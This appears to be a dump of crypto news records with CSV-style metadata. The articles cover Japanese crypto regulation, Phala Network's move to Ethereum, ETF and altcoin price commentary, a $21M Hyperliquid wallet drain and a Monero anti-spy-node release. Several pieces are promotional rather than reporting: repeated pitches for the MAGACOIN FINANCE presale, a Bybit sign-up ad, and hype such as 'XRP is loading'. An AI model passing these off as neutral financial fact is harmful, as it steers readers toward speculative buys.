to investment. In turn, Japan’s regulatory framework has also developed in that direction. Japan regulators tighten crypto oversight Currently, the Financial Services Agency (FSA), is considering moving crypto assets from the Payment Services Act (PSA) to the Financial Instruments and Exchange Act (FIEA) in order to strengthen investor protection and maintain consistency with securities regulation. The discussions align with Japan’s Finance Minister Katsunobu Kato’s statement that “crypto assets will be recognized as part of investment portfolios.” The proposed classification of crypto assets under Japan’s securities law could serve as the catalyst for sweeping tax incentives. This reform would shift crypto gains from the current maximum 55 percent tax bracket, under miscellaneous income, to a uniform 20 percent capital gains rate. Consumer appetite for crypto payments is on the rise, but the growing market is forcing regulators to crack down on illicit operators. Behind the scenes, the FSA monitors a continuous stream of unregistered crypto exchanges operating in Japan . At the end of 2024, the FSA flagged some 20 foreign and domestic unauthorized crypto exchanges soliciting Japanese residents. Japan mandates a rigorous regulatory oversight for crypto firms. Under the PSA, all crypto exchanges must register with the FSA. They are further monitored by the Japan Virtual and Crypto Assets Exchange Association (JVCEA), which sets binding rules on asset custody, token listings, leverage limits, and anti-money-laundering (AML) measures. Police crack down on crypto gambling crimes The regulatory perimeter, however, is being increasingly challenged by crypto’s role in offshore crime. Japan’s National Police Agency (NPA) is also on high alert for crypto crimes. It has reported a string of cases linking crypto with illegal online gambling and betting. Japan bans most private gambling, allowing only government-run sports betting and lotteries. Still, growing acceptance of crypto has made it easier for residents, including minors, to access foreign, online casinos that fall outside Japan’s regulatory reach. On October 8, a 13-year old boy was apprehended by police for using his allowance as well as stolen cash to purchase crypto and place bets on overseas online casinos. On the same day, local media reported the arrest of a 19-year old man for operating an unregistered crypto exchange and using the proceeds to gamble online. The arrests highlight the growing pains of a market where crypto use is expanding faster than regulatory enforcement. “Japan’s crypto industry is still in a developing stage compared with overseas markets,” Mercoin’s Kobayashi said. “We believe it’s important to first energize the industry on the whole and help more people recognize crypto as something that is familiar and approachable.” Get $50 free to trade crypto when you sign up to Bybit now",News|Bic Camera|Binance|BTC|FSA|JPY|JVCEA|Mercari|Mercoin|NPA|Softbank|Yahoo,EN,0,0,CRYPTOCURRENCY|ASIA|MARKET|EXCHANGE|BNB,"{'name': 'Cryptopolitan', 'img': 'https://images.cryptocompare.com/news/default/cryptopolitan.png', 'lang': 'EN'}",cryptopolitan,2025-10-10 11:53:20

Meanwhile, the Fear and Greed Index is at 55 as compared to the 62 of yesterday. This is a cooling effect which shows that traders are getting cautious. In the past, the neutral readings usually precede periods of consolidation before a new trend of the market develops. Along this sentiment reset, other altcoins, Cardano (ADA), Solana (SOL) and Polygon (MATIC) , are also regaining the investors trust as leading accumulation candidates. Together with these, analysts have also been monitoring MAGACOIN FINANCE , a growing presale project that can benefit from renewed investor rotation towards undervalued assets. Crypto Fear & Greed Index Hits 55 The neutral reading of 55 indicates a cooling down of investor enthusiasm. This follows several weeks of bullish action throughout the market that drove Bitcoin and other key altcoins to several-month highs. In the past, this sentiment was accompanied by periods of sideways movement prior to the subsequent move. Often traders will take profits when waiting for direction confirming macroeconomic or ETF-related catalysts. ADA Crypto Fear & Greed Index: Source: CMC In this cautious period, capital generally moves out to other assets which have a greater growth potential and lower entry costs. Therefore, new ventures such as MAGACOIN FINANCE can benefit from investors who want to take fresh opportunities at this time of consolidation. ADA Open Interest Hits $1.57 Billion Cardano’s (ADA) open interest surged to $1.57 billion, reflecting growing trader activity around the asset. The increase comes as ADA stabilizes near $0.82, with market participants watching the $0.84–$0.90 resistance range. A sustained breakout above these levels could confirm renewed bullish momentum. On the downside, immediate support lies at $0.80–$0.78, where buyers have repeatedly defended price dips. If Bitcoin maintains stability, ADA could lead mid-cap altcoin performance during the next bullish rotation. Given this setup, MAGACOIN FINANCE emerged alongside ADA as one of the best altcoins to buy , offering exposure to early growth potential. Solana Price Prediction Another strong contender in the current market cycle is Solana (SOL) . Trading above $220 , Solana continues to display resilience despite a slight decline in its DeFi total value locked (TVL). Bulls aim to reclaim momentum toward the $250 resistance level, though lower on-chain activity could slow short-term gains. Also, the Relative Strength Index (RSI) indicates moderate bullish momentum, which could intensify if on-chain data improves. Analysts believe that any renewed rally in Solana may trigger capital rotation into newer ecosystem projects. Such market conditions often draw investor attention to emerging altcoins, including MAGACOIN FINANCE . Polygon Rolls Out Rio Upgrade Polygon (MATIC) launched the Rio Hardfork Upgrade, marking a significant milestone in its scaling roadmap. The update aims to enhance network efficiency, targeting up to 5,000 transactions per second (TPS), while reducing hardware costs and energy consumption. Key proposals, such as PIP-64, PIP-65, and PIP-72, introduce a Validator-Elected Block Producer model and fairer fee distribution, thereby reinforcing decentralization and performance. Source: X This upgrade strengthens Polygon’s position as a leading Ethereum scaling solution, especially for stablecoin payments and tokenized real-world assets. MATIC, which has recently declined by 14% over the past month, may attract renewed investor interest as network performance improves. Moreover, Polygon’s progress underscores investor appetite for utility-driven projects, a trend that could spill over to high-potential newcomers like MAGACOIN FINANCE . MAGACOIN FINANCE: The Rising Star in Altcoin Presales While major altcoins consolidate, MAGACOIN FINANCE is emerging as one of the top presale cryptos, gaining strong community traction. Built on Ethereum, the project combines tokenized finance, governance, and transparency to appeal to both retail and institutional investors. Its early-stage presale phase has attracted attention due to its clear tokenomics, low entry valuation, and focus on long-term ecosystem sustainability. The project capped supply, audited smart contracts, and an expanding holder base, positioning it as a contender for 2025’s altcoin rally. With sentiment cooling across major caps, early investors are turning toward presales that offer high upside potential before listings. MAGACOIN FINANCE aligns perfectly with this narrative, providing exposure to a developing ecosystem. Conclusion With the Fear and Greed Index signaling a neutral market phase, traders are changing their strategies. Major altcoins such as Cardano , Solana , and Polygon are positioned to benefit from the next capital rotation once sentiment turns bullish again. Meanwhile, MAGACOIN FINANCE stands out as a fresh opportunity amid this consolidation as investors diversify into early-stage assets.

According to forum notes published by Phala Network Ecosystem leader doylegxd, the Ethereum L2 migration will see PHA token holders receive vPHA (ERC-20) at a 1:1 ratio. Migration will begin before November 20, coinciding with the expiration of Phala’s parachain slot on Polkadot . Staking, rewards, and governance are all expected to continue immediately after the transition. Phala moves on from Polkadot Phala Network was among the first projects to secure a Polkadot parachain slot during the 2021 auctions, aiming to build a decentralized cloud computing platform for private, scalable computation and AI-powered Web3 applications. The network currently operates on Intel SGX, a hardware-based security technology. However, Intel has been investing more towards Intel TDX and GPU confidential computing, leaving SGX only for existing deployments. It leaves Phala with a dwindling support base that has limited the long-term viability for SGX miners. According to the doylegxd, SGX-based miners require continued investment because their technology is fading. Still, the network’s delegation is stable at about 65 million PHA, supported by roughly 29,000 active miners. “Keeping it alive would consume significant resources while locking us into an infrastructure with limited scalability,” the ecosystem lead wrote . The Layer 2 network is already operational, featuring an integrated explorer at explorer.phala.network for transparent activity tracking, and a bridge at bridge.phala.network with smooth PHA transfers between Ethereum and the L2. “Phala L2 will serve as the execution layer for GPU and TDX confidential compute, while staking and governance remain secured on Ethereum L1,” the proposal read. Proposal outlines migration plan timeline Phala’s community voting and communication on migration began on September 26 and was scheduled to run through October 15, although the majority being in favor of switching networks has closed the vote early. Development and exchange preparation will commence immediately after the voting period ends and will continue up to November 20. During this time, the team is finalizing the Ethereum Layer 1 staking contract, completing the vPHA issuance logic, and building a claim interface within the Phala App. Doylegxd mentioned security audits and internal testing to determine the safety of migration contracts and tools are ongoing. Phala is also concurrently coordinating with exchanges like Gate.io to disable Polkadot parachain deposits and withdrawals, handing over operations to the Ethereum L2 infrastructure. Collators, gatekeepers, and other parachain components will be deactivated on Polkadot, and Phala’s development team will freeze assets until the next phase opens. Between November 20 and November 25, Phala’s Layer 2 will officially become the new network for staking, governance, and confidential compute operations. PHA tokens staked on Ethereum Layer 1 will convert to vPHA, the functional token of the ecosystem. Users can claim parachain assets through the Phala App, while existing delegations will automatically map to the new staking system. Any unclaimed assets from previous deployments will also be recoverable through the same interface. Governance migration is planned between November 26 and November 30, with all treasury and voting activities moving to Ethereum Layer 1. Governance will use snapshot voting and safe multisig for security, while vPHA becomes the governance utility token. After November 30, the project will shift its focus toward long-term development. GPU miners will begin operating directly on the Layer 2, earning rewards in vPHA.

FBTC is supported by increasing institutional adoption, friendlier regulation, and the potential for future central bank Bitcoin holdings. While Bitcoin remains volatile, dips—especially near previous lows—are considered attractive buying opportunities for FBTC investors. Precious metals have been grabbing most of the headlines in recent months as they surge higher, but it's also been a solid year for Bitcoin and the Fidelity Wise Origin Bitcoin Fund ETF ( FBTC ), which made a new all-time high in October. This article looks at why Bitcoin and FBTC should continue higher over the medium and long term as several powerful drivers align. 1. Fiat Concerns, Dovish Banks and Lower Rates My last article on FBTC was published back in May and titled "" Breaking Out On Fiat Fears. "" To summarize, Moody's had just downgraded the US credit rating, further eroding trust in the US dollar. This ignited a strong move in FBTC to all-time highs, as Bitcoin is an alternative to fiat currency. Since then, the situation for the US dollar and for other global currencies has worsened. President Trump's ""Big Beautiful Bill"" passed and is set to deepen fiscal deficits, at least over the next few years, until the US government can grow its finances sufficiently (an optimistic view). More recently, the Fed shifted dovishly and resumed its cutting cycle. A cut in September initially led to a brief drop in Bitcoin, but it has since recovered and made new all-time highs in October. More cuts are on the way, with 25 bps in September nearly fully priced, 25bps in December around 80% likely according to the CME FedWatch tool . That may just be the start. We now have Trump pick Steve Miran as a new governor, and he is advocating for aggressive cuts towards the low 2% area. That is around 2% lower. And when current Chair Powell is replaced in May, he will almost certainly be replaced by a dove to guide rates towards this goal. The dovish shift in the Fed highlights that the Fed will ease at the slightest hint of economic weakness. They have framed the shift as ""risk management,"" but unemployment of 4.3% is not necessarily a level to make a series of cuts, especially when inflation is on the rise. Trading Economics The apparent abandonment of the inflation side of the Fed's mandate is particularly positive for FBTC. Bitcoin is considered an inflation hedge. Furthermore, the divisions in the Fed (the recent meeting had very divided opinions on where rates should be in December) and the upcoming Chair change could lead to a muddled policy. I already think the Fed may be making a policy mistake by cutting aggressively just when inflation is a risk again. Taken together, the rate cuts, the rise in inflation, and the lack of cohesion at the Fed all spell trouble for the US dollar and make alternative currencies more attractive. And, of course, Bitcoin is a global asset, and global currencies have their own domestic negatives. The ECB has cut 8 times, and just look at the Swiss National Bank, which has cut back to 0% and has nowhere to go but negative rates again. If the US economy should finally fall back into a recession, the Fed could do the same. In any case, the trend is clear: rates are heading lower. MacroMicro Lower rates make alternative assets like Bitcoin and gold more attractive. If yields are at 5%, bonds may be considered a safe place to park some cash and earn modest interest. If yields are 2%, bonds are no longer keeping up with inflation, and the investment no longer makes sense. The money is forced to look elsewhere. 2. Powerful Support It's becoming easier to buy and own crypto, thanks to the launch of ETFs like FBTC and deregulation. The Trump administration is crypto-friendly and swiftly pushed through the CLARITY Act, the GENIUS Act and established a federal ""Strategic Bitcoin Reserve."" The latter stopped short of actually buying crypto, but it may be a matter of time. Earlier this week, Deutsche Bank suggested central banks will end up holding Bitcoin : A strategic Bitcoin allocation could emerge as a modern cornerstone of financial security, echoing gold’s role in the 20th century. Assessing volatility, liquidity, strategic value and trust, we find that both assets will likely feature on central bank balance sheets by 2030. Central banks are not buying right now, but the prospect of this in the future is a reason to be optimistic. We only have to look at gold's move in 2024 and 2025 to see what central bank buying can do. In the meantime, FBTC can benefit from the institutional rush to buy. With a friendlier regulatory environment under the Trump administration, nearly 60% of institutional investors plan to boost their crypto allocation in the coming year, and average exposure is expected to more than double within three years, according to State Street's annual digital assets and emerging technology survey released on Thursday. Institutions are late to the crypto party and are underinvested. State Street continued, The average portfolio allocation across a range of digital assets stood at 7%, the survey found, and that's expected to jump to 16% by 2028. This will be powerful support. Indeed, Bitcoin has a lot of powerful supporters. Indian Times With strong institutional buying, the potential for central bank buying, and the President of the US on your side, the long-term outlook looks positive. FBTC Basics FBTC has been somewhat eclipsed by the iShares Bitcoin Trust ETF ( IBIT ), which has grown its AUM to $97B. Data by YCharts This isn't necessarily a reflection of better quality. There is almost no difference between the two funds. They both have an expense ratio of 0.25% and the returns are almost identical. Data by YCharts I think it may have something to do with BlackRock's iShares series being more visible and well-known. When given the choice between two brands, most people choose the one they know best. One consideration is that FBTC and IBIT have different custodians, and Fidelity is a self-custodian. If you are worried about safety, it may be wise to spread assets between both funds. Risks Bitcoin is a volatile asset and has experienced several major bear markets in the last decade. The last one was in 2021-2022 when Bitcoin dropped 77%. While the outlook in 2025 looks better than it was in 2021, another large drop can't be ruled out. I would be particularly careful if the trend from the 2022 low breaks. TradingView The 2021 highs around $65,000 might be tested in a major bear market, but I am doubtful any drop would get this far, and I would view it as a great buying opportunity. Conclusions 2025 has been a great year for crypto, Bitcoin and FBTC. The downgrade to US government debt and the dovish shift by the Fed, despite the backdrop of rising inflation, make Bitcoin attractive compared to fiat-backed assets. Furthermore, deregulation and a supportive President have led to an institutional rush to buy. At some point, central banks may join the buying frenzy. The FBTC outlook for the long term, therefore, looks better than ever as powerful drivers align. That doesn't mean the path higher will be smooth, but it does mean that dips should be considered buying opportunities.",FBTC,EN,0,0,MACROECONOMICS|CRYPTOCURRENCY|BTC|FIAT|REGULATION,"{'name': 'Seeking Alpha', 'img': 'https://images.cryptocompare.com/news/default/seekingalpha.png', 'lang': 'EN'}",seekingalpha,2025-10-10 12:00:11

This represents the slowdown brought about by profit-taking as investors secure their position. However, this does not mean that the favor has fallen back to the bears. In fact, the Dogecoin price remains in a bullish position, and as long as key factors continue to hold, then the meme coin could see a colorful breakout rally from here. The Broadening Wedge And What It Means Pseudonymous crypto analyst Gandalf Crypto took to the X (formerly Twitter) platform to share some interesting things about the Dogecoin price action. The price has so far been characterized by higher highs and lower lows, not suggesting a particular direction. But just shows that volatility is becoming higher and higher. This could lead to wild fluctuations in the Dogecoin price. Related Reading: Analyst Urges All XRP Investors To Pay Attention To This Connection No One Has Made Before Nevertheless, the fact that the altcoin continues to trade inside a Broadening Wedge pattern is worth noting. As is the case with a broadening wedge pattern, the direction in which the price breaks could determine whether the rally would continue or if the price decline would deepen. In the case of a breakout of the upper trendline toward $0.28, it would signal that the bulls will continue to push the Dogecoin price higher. However, on the flip side, there is the possibility that the price breaks below the lower trendline and makes its way toward $0.2. In that case, a deeper correction will be expected. Key Things To Watch Out For With The Dogecoin Price As the crypto analyst explains, the Dogecoin price is now nearing its resolution point within the Broadening Wedge pattern. At this junction, there are a number of things to watch that could serve as confirmation for which direction will likely play out. The first of these is in the case of a breakout, and that is the upper trendline, as already outlined above. This break would signal a bullish continuation, but it would need to be supported by adequate volume to maintain this path. Related Reading: Can The Bitcoin Price Explode To $200,000? The Gold Chart That Tells It All Without volume, momentum struggles and could end up falling back down. But as long as the volume follows the breakout, it could lead to a Wave 7 after the completion of the Wave 6. The target for this would lie above $0.34. The more bearish path is in the case where the price completely breaks all three supports from $0.24 all the way down to $0.22. This would invalidate the entire bullish thesis, putting the bears in charge once more.

XRP, long viewed as a leading candidate for institutional adoption in the payments sector, has seen its momentum stall in recent weeks. The token’s decline comes amid broader uncertainty across the altcoin market, with profit-taking by whales, large investors who control substantial token supplies, intensifying selling pressure. Royalityworld suggests that this “whale-driven panic” amplified XRP’s drop, triggering stop-loss cascades and liquidations on leveraged positions. From a technical perspective, XRP’s chart shows clear signs of a breakdown after losing key moving averages and slipping below its bullish channel. Short-term sentiment has turned bearish, but analysts point to the $2.70–$2.80 range as a critical on-chain accumulation zone where long-term holders are defending positions. Meanwhile, stabilized wallet activity suggests selling pressure may be easing, hinting that the worst of the correction could be over. Adding to the uncertainty is the stalled progress on XRP ETF developments. After early-year optimism over potential approvals, the silence from regulators has left investors cautious. According to Royalityworld, this stagnation has dampened sentiment, with traders now waiting for regulatory clarity that could revive institutional interest and fuel XRP’s next major rally. Despite recent volatility, analysts remain cautiously optimistic. Royalityworld identifies $2.88 as the pivotal level for a potential reversal, a decisive breakout above it could reignite bullish momentum and restore XRP’s broader uptrend. Ripple Formally Integrated into the Eurosystem via Strategic Partnership with SIA According to renowned crypto observer SMQKE, Ripple has been formally integrated into the Eurosystem through its strategic partnership with SIA, an Italian payment infrastructure provider known for connecting Europe’s major banks and central institutions. Therefore, this development marks a significant milestone for Ripple, positioning it at the heart of Europe’s digital finance infrastructure. SIA, now part of Nexi Group, runs one of Europe’s most advanced and secure financial networks, connecting banks, payment processors, and central banks through real-time infrastructure. By integrating Ripple’s blockchain-powered settlement technology, this network gains the potential to deliver faster, cheaper, and more transparent cross-border payments across the Eurozone, embedding Ripple directly into the core of Europe’s financial system. SMQKE emphasized that this integration marks more than just a partnership, it signifies Ripple’s official entry into the Eurosystem, which includes the European Central Bank and national central banks across the Eurozone. Through SIA’s extensive network, Ripple gains direct access to major European financial institutions, positioning the XRP Ledger for institutional adoption within regulated payment infrastructure. Conclusion XRP’s recent downturn underscores the fragile interplay between sentiment, technicals, and institutional momentum. Whale-driven selloffs and stalled ETF progress have clouded near-term outlooks, yet strong on-chain support at $2.70–$2.80 reflects enduring investor confidence. The $2.88 mark now serves as a pivotal psychological and technical barrier, its reclaim could reignite bullish momentum and transform fear into renewed optimism. Ripple’s integration into the Eurosystem via SIA marks a strategic breakthrough for blockchain adoption in regulated finance. By linking the XRP Ledger to one of Europe’s core payment infrastructures, Ripple positions itself at the crossroads of traditional banking and digital settlement innovation. Therefore, this move strengthens its institutional credibility while signaling Europe’s growing embrace of blockchain technology within its financial framework.",News|Ripple,EN,0,0,CRYPTOCURRENCY|XRP|MACROECONOMICS|TRADING|BUSINESS,"{'name': 'Coinpaper', 'img': 'https://resources.cryptocompare.com/news/93/default.png', 'lang': 'EN'}",coinpaper,2025-10-10 12:02:56

The pullback came after a strong rally that lifted the world’s largest cryptocurrency to a new record above $126,000 earlier this week. The Macroeconomic Pressure on Digital Assets According to market analyst Jamie Coutts, the downturn reflects macro forces rather than internal weakness. “Bitcoin’s dip isn’t mysterious — it’s macro,” he wrote on X earlier today, noting that the U.S. Dollar Index (DXY) has rebounded toward the key 100–101 resistance range after one of its steepest drops in decades. Coutts explained that the dollar’s rebound is squeezing liquidity worldwide, creating short-term pressure on risk assets such as BTC. “The real question: is this the start of a new dollar cycle or just the setup for the next leg lower?” asked the analyst. “Base case: liquidity tailwinds and an improving business cycle keep the outlook for risk assets bullish into mid-2026,” he concluded. At present, liquidity data confirms this link. On October 9, CryptoQuant market technician Arab Chain showed that open interest on Binance had fallen by 7.9%, from $15.07 billion to $13.88 billion. According to him, it meant that traders were closing leveraged positions and exercising greater caution. This drop in market leverage usually happens before a period of consolidation, meaning that the previous rapid price advance was supported by speculative activity that is now winding down. Regional Flows and Neutral Miner Sentiment Point to Balance A report published by CryptoQuant towards the end of last month revealed that Bitcoin’s direction in the coming weeks would likely hinge on liquidity flows between Asian and U.S. markets. According to the analytics platform, the Coinbase Premium Index, which measures the price gap between U.S. and Asian exchanges, remains mildly positive, suggesting the existence of steady institutional demand, while moderate Kimchi Premium readings in Korea indicate restrained retail participation. On-chain data also paints a balanced picture. As noted by market watcher Axel Adler Jr. on X earlier today, the Puell Multiple stands at 1.1 with Bitcoin near $121,600, a level suggesting miners are operating just above average profitability. “The risk of capitulation is low, but there’s also no overheating like at cycle peaks,” Adler wrote, describing the setup as “neutral to bullish.” Meanwhile, at the time of this writing, Bitcoin was trading around $121,422, down 0.4% in the last 24 hours but up 1.2% weekly and nearly 99% year-on-year, according to CoinGecko. While the dollar’s rebound has temporarily cooled the market, most analysts, including Coutts, expect liquidity tailwinds and an improving business cycle to keep the broader outlook constructive into mid-2026.

Here’s why",https://timestabloid.com/market-strategist-hold-tight-xrp-is-loading-heres-why/,"In the fast-moving world of finance, disruption rarely arrives with warning. It often begins with a simple conversation that challenges long-standing systems. That’s exactly what happened when Patrick Bet-David, renowned entrepreneur and market strategist, dissected the outdated state of global payments in a recent PBD podcast clip shared by Levi Rietveld on X. His remarks sparked a renewed discussion on the potential of blockchain solutions like XRP to revolutionize global money transfers. Outdated Systems Still Dominate Global Finance Bet-David began by pointing out a curious irony in traditional banking: “A great point — ACH is younger than wire, yet the wire is faster,” he said. The statement underscores how legacy systems continue to dominate modern finance despite technological advancement. Transactions that should be instantaneous still take days to settle — a costly inefficiency in an era defined by digital speed. This inefficiency forms the core of what Bet-David called a “pain point” in global money movement. The reliance on older, slower systems has left banks and businesses frustrated, creating an opening for faster, blockchain-based alternatives. Hold Tight, #XRP Is Loading!!!!!!! pic.twitter.com/EvYVjQb115 — Levi | Crypto Crusaders (@LeviRietveld) October 9, 2025 Ripple, XRP, and the Push for Real-Time Payments As the discussion progressed, Bet-David referenced some of the most talked-about technologies in cross-border transactions. “You hear Ripple, XRP, Swift — what that could do,” he remarked, signaling how these systems are now part of serious industry conversations. While Bet-David didn’t single out one solution as superior, his acknowledgment of Ripple and XRP placed them among the front-runners in reimagining international settlement — an area long constrained by inefficiency and high costs. His tone reflected what many in the financial sector are starting to recognize: blockchain solutions are no longer speculative; they are viable and ready for institutional use. SWIFT: The Antiquated Network Holding Back Progress Bet-David’s most striking remarks came when he compared traditional systems such as SWIFT with modern alternatives. “Swift is a very antiquated system,” he stated, emphasizing that it doesn’t actually move money. Instead, “It’s actually a messaging device where you say, ‘We’re sending you over X amount of money,’ and then the bank adjusts accordingly.” That outdated structure — built for a paper-based era — has become the bottleneck for cross-border transfers. By contrast, blockchain networks can confirm and settle transactions in seconds, without the need for intermediary banks or manual reconciliation. We are on X, follow us to connect with us :- @TimesTabloid1 — TimesTabloid (@TimesTabloid1) June 15, 2025 The Speed and Efficiency of Blockchain Solutions Highlighting this contrast, Bet-David said, “All the stats I’ve seen on how fast Ripple could do it — or any other competitors for that — they can do it much faster, more cheaply. ” His comments reveal an emerging awareness among financial professionals: the tools to modernize the global payment infrastructure already exist, and they operate at a fraction of today’s cost and time. He concluded by stressing the global implications of this evolution, remarking that “you can’t send money in the world instantly right now.” It’s a challenge that blockchain technology — and XRP in particular — appears uniquely positioned to solve. The Broader Market Implication Levi Rietveld’s decision to spotlight this conversation on X amplified more than just a podcast quote. It highlighted a growing recognition that the financial world is at an inflection point. The next generation of payment technology is being tested, refined, and increasingly embraced by institutions that once resisted change. Patrick Bet-David’s candid assessment captured that reality in simple terms — the systems we use to move money are overdue for replacement, and blockchain innovations like XRP are no longer in the experimental stage. For both investors and observers, the message is clear: change is already underway. Hold tight — XRP is loading.

The trader lost over $17M in DAI, with the rest in Maple Protocol stablecoins. A Hyperliquid whale became the target of an exploit, presumably based on compromised private keys. The trader lost a total of $21M, of which over $17M was in DAI tokens. According to PeckShield Alert, only the personal wallet was affected through an unidentified type of private key leak. #PeckShieldAlert A victim 0x0cdC…E955 lost ~$21M worth of crypto on #Hyperliquid due to a private key leak.

The recent loss extends the list of cases attacking perp DEX traders. As Hyperliquid is transparent when it comes to trades and wallet balances, the wallets are singled out for personalized exploits. Hacked wallet got liquidated on HYPE The attacked wallet was drained just after closing a successful trade, so the exploiters knew the funds were available. The hacker’s actions affected multiple vaults on Hyperliquid, using the compromised accounts for activity on both Ethereum and Arbitrum. Additional reports suggest another $300K was lost on a related wallet linked to the same user. The exploit started after the wallet closed a $16M long position on HYPE, and the wallet immediately sold 100K HYPE for $4.4M. The token was sold for DAI, which was then transferred on Ethereum and mixed. Additionally, due to the compromised wallet, the hacker was able to take a $3.1M stake from the Plasma Syrup Vault. The hacker moved MSYRUPUSDP to a new address , for now, without further swaps or mixing. The hacker now holds $6.91M in one wallet on Ethereum, another $10M in a different Ethereum address, while emptying the intermediary Arbitrum wallet used for the initial wallet draining. Is Hyperliquid at risk of hacks? Previously, Hyperliquid has seen FUD about being vulnerable to North Korean hackers. However, the exchange holds no funds in custody and has not been hacked so far. The DEX still holds a risk of aggressive trading and draining specific vaults, especially for low-liquidity assets. Following the recent whale wallet attack, HYPE remained at $44.41, awaiting another breakout. The only problem in the future would be for the owner of the compromised wallet. Currently, Hyperliquid is preparing for another airdrop season, with multiple new projects set to launch their tokens. The compromised wallet may receive rewards based on trading volumes, but those may also be swept by the hacker. Previously, a list of 1,200 compromised addresses emerged, with some active on Hyperliquid. However, none of those addresses held any significant funds. There is still no explanation on how the wallet was compromised, though recent attacks have involved malware, fake 2FA authentication, fake Zoom links and more.

The acquisition comes as Fundstrat technical analyst Mark Newton predicted Ethereum would bottom over the next one to two days before rallying to $5,500, representing approximately 27% upside from current levels around $4,345. BitMine Amasses $12.4B Treasury Despite Short-Seller Attack BitMine officially holds 2.83 million ETH valued at roughly $12.4 billion, making it the largest public Ethereum treasury and second-largest crypto treasury behind Michael Saylor’s Strategy. The company, led by Fundstrat co-founder Tom Lee, has stated on multiple occasions that it aims to accumulate 5% of Ethereum’s total supply and remains committed to supporting the network’s growing role in financial market services. The latest purchase follows a week after BitMine received 20,020 ETH worth $89.7 million via FalconX on October 3, totaling over $193 million in Ethereum acquisitions within seven days. Bitmine keeps accumulating $ETH — 5 hours ago, they received another 23,823 $ETH ($103.68M) from BitGo. https://t.co/DLOO6fgc7K https://t.co/w5uTBr9jZg pic.twitter.com/nScuFMDf5X — Lookonchain (@lookonchain) October 10, 2025 However, shares of BMNR traded down 1.5% on Thursday, closing at $59.10, while Ethereum declined 1% over the past 24 hours to trade at $4,336. The accumulation comes despite short-selling firm Kerrisdale Capital announcing a bearish position against BitMine on October 9, calling its business model “ a relic on the verge of extinction .” Newton’s technical analysis suggests Ethereum has experienced a minor three-wave pullback following a strong rally from September 25 into October 7, with the correction expected to end by October 11 before turning higher. He noted ETH has already corrected 50% of the recent rally but could hit $4,200 to $4,220, providing an optimal support area before reversing upward. The projection comes as institutional demand for Ethereum hits new highs, with treasury firms and exchange-traded funds now holding over 12.48 million ETH, roughly 10.31% of the network’s total supply.

The Nasdaq-listed crypto infrastructure firm now holds approximately 150,244 ETH, marking a 50% increase as it pivots from Bitcoin mining to a full-fledged Ethereum-focused operation. Major crypto-focused investors, including Kraken Financial, Jump Trading Credit, and Jane Street Capital, participated in the offering. SharpLink Gaming disclosed it now holds 839,000 ETH with no debt on its balance sheet, generating over $900 million in unrealized gains since launching its Ethereum treasury strategy in June. The company plans to tokenize its common stock on Ethereum and stake part of its holdings on Linea, a Layer 2 network developed by Consensys. Joseph Lubin, SharpLink chairman and Consensys founder, said the company would continue accumulating Ether. According to data from StrategicETHReserve, corporate treasuries hold approximately 5.70 million ETH, representing 4.71% of supply, while spot Ethereum ETFs collectively own around 6.93 million ETH, representing 5.73%. Source: StrategicETHReserve Giving the bullish institutional adoption, Crypto hedge fund XWIN Finance argues Ethereum could reach $10,000 this cycle , driven by macro liquidity trends. While Bitcoin surged over 130% since 2022 in response to M2 expansion, Ethereum lagged with only 15% gains. However, ETH exchange reserves dropped over 25% since 2022, with negative netflows indicating coins are being locked in staking or cold wallets. Validator Exit Queue Raises Concerns Despite Record DeFi TVL A record $10 billion worth of Ethereum, exactly 2.44 million ETH, remains stuck in the validator exit queue as of October 8, with validators facing an average wait time exceeding 42 days. The withdrawal backlog is one of the largest since Ethereum’s transition to proof-of-stake, which has raised concerns of potential selling pressure as ETH trades around $4,500, just 9.75% below its all-time high. Analysts warn that if a substantial portion of queued ETH is eventually unstaked and moved to exchanges, selling pressure could trigger retracement toward the $3,800 to $4,000 support zone. Decentralized Finance reached a milestone in Q3 2025 , closing with a total value locked of $237 billion according to DappRadar. Source: DappRadar Despite Ethereum’s growth picking up mid-year, it commanded over 49% of the sector’s value with $119 billion in TVL despite experiencing a 4% decline. However, the dapp industry witnessed a 22.4% decline in daily unique active wallets, averaging 18.7 million daily during Q3, raising concerns about potential retail market exit. Technical Analysis Points to Critical Support Test Ethereum currently trades around $4,330 with immediate support at the $4,250 to $4,300 zone that provided multiple bounce opportunities throughout September and October. $ETH had a bounceback from the $4,250 support level. If this level holds, Ethereum will show some recovery. If ETH fails to hold this level, expect a correction towards the $4,000 level. pic.twitter.com/JHEuPFxn8b — Ted (@TedPillows) October 10, 2025 Resistance levels sit at $4,412, $4,792, and ultimately $4,956, which are previous peaks. The consolidation between $4,000 and $4,800 creates a decision zone for future direction. The $4,250 to $4,300 support has held through multiple tests, though it is now showing signs of weakening. The most probable near-term scenarios include continued range-bound trading between $4,000 and $4,600, potential breakdown toward $3,800 to $4,000 if support fails, or breakout toward $4,700 to $5,000 if momentum develops. As it stands now, Ethereum faces genuine uncertainty at current levels, with the $4,250 to $4,300 support zone critical. If this level holds and corporate accumulation catalyzes additional buying, ETH could advance toward Newton’s $5,500 target within weeks. However, failure to maintain support would likely trigger a correction toward $3,800 to $4,000, with the massive validator exit queue adding downside pressure. Currently, both scenarios remain viable; however, the current technical setup favors consolidation before the next directional move materializes.

The blockchain announced CLI v0.18.4.3 “Fluorine Fermi”, calling it a highly recommended release that enhances protection against spy nodes. In the Monero community, the term “spy nodes” refers to malicious nodes, their groups, or botnets that are capable of linking IP addresses with transactions, effectively undermining the blockchain’s privacy guarantees. Spy nodes have been a major concern in Monero’s ecosystem . Its community has long viewed these attacks as one of the most persistent threats to its mission of untraceable transactions. Monero privacy issues were, in part, brought into the spotlight via a leaked Chainalysis video that appeared in September 2024. It claimed that Chainalysis was able to track transactions back to 2021 via its own “malicious” Monero nodes. We're excited to announce that CLI v0.18.4.3 'Fluorine Fermi' has been released! 'This is a highly recommended release that enhances protection against spy nodes.' — Monero (XMR) (@monero) October 9, 2025 The new upgrade adds another layer of protection to counter such threats, while also improving network reliability and stability. ‘Fluorine Fermi’ update solves major challenges Given that spy nodes threaten the privacy of users in contrast to the main aim of the project, the community has worked hard to find workarounds, establish safety practices, promote self-node operation, and utilize software to provide a shield against malicious nodes on Monero. There are a few important technologies that protect privacy: each transaction uses a different stealth address so that the recipient’s real address stays hidden; ring signatures mix a sender’s transaction with other fake transactions, making it hard to tell who really sent the money; and Ring Confidential Transactions (RingCT) hide the amount being sent. Another tool the community promotes is the use of Dandelion++, software designed to prevent malicious actors from linking IP addresses to transactions. However, there are still more challenges. For instance, a paper published on the research sharing platform arXiv in September noted the growing presence of non-standard nodes in the network. These nodes pose as honest nodes but are likely intended for monitoring the network and spying on other 